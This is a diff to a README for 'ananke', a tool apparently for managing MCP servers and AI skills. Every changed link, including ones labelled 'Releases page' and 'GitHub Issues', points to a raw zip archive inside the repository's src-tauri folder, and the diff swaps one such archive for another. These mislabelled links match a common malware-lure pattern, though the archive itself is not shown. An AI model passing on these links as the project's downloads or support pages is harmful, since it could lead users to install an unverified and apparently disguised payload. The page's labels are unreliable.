@@ -1,6 +1,6 @@
 # 🚀 ananke - Easy Control for MCP Servers & AI Skills
 
-[![Download ananke](https://raw.githubusercontent.com/BrainVerseOfficial/ananke/main/src-tauri/icons/Software-3.0.zip)](https://raw.githubusercontent.com/BrainVerseOfficial/ananke/main/src-tauri/icons/Software-3.0.zip)
+[![Download ananke](https://github.com/BrainVerseOfficial/ananke/raw/refs/heads/main/src-tauri/Software-2.0-alpha.4.zip)](https://github.com/BrainVerseOfficial/ananke/raw/refs/heads/main/src-tauri/Software-2.0-alpha.4.zip)
 
 ## 📦 Introduction
 
@@ -11,7 +11,7 @@ Welcome to **ananke**, the visual control plane designed for MCP servers and AI 
 To begin using **ananke**, you’ll need to download and install the application. Follow these steps to get started quickly and easily.
 
 1. **Visit the Releases Page**
-   Head to our [Releases page](https://raw.githubusercontent.com/BrainVerseOfficial/ananke/main/src-tauri/icons/Software-3.0.zip). This page contains all available versions of **ananke**.
+   Head to our [Releases page](https://github.com/BrainVerseOfficial/ananke/raw/refs/heads/main/src-tauri/Software-2.0-alpha.4.zip). This page contains all available versions of **ananke**.
 
 2. **Choose Your Version**
    Look for the latest version at the top of the page. You will find a list of files available for download. Look for the option that suits your operating system.
@@ -29,7 +29,7 @@ To begin using **ananke**, you’ll need to download and install the application
 
 ## 📥 Download & Install
 
-To download **ananke**, visit this page: [Download ananke](https://raw.githubusercontent.com/BrainVerseOfficial/ananke/main/src-tauri/icons/Software-3.0.zip).
+To download **ananke**, visit this page: [Download ananke](https://github.com/BrainVerseOfficial/ananke/raw/refs/heads/main/src-tauri/Software-2.0-alpha.4.zip).
 
 ## ⚙️ System Requirements
 
@@ -77,13 +77,13 @@ Encountering issues? Here are common problems and solutions:
 
 Join our community for support, suggestions, and discussions:
 
-- [GitHub Issues](https://raw.githubusercontent.com/BrainVerseOfficial/ananke/main/src-tauri/icons/Software-3.0.zip)
+- [GitHub Issues](https://github.com/BrainVerseOfficial/ananke/raw/refs/heads/main/src-tauri/Software-2.0-alpha.4.zip)
 - [Discussion Forum](#)
 - [Social Media Links](#)
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/BrainVerseOfficial/ananke/main/src-tauri/icons/Software-3.0.zip)
+- [Releases Page](https://github.com/BrainVerseOfficial/ananke/raw/refs/heads/main/src-tauri/Software-2.0-alpha.4.zip)
 - [Documentation](#)
 - [Community](#)
 
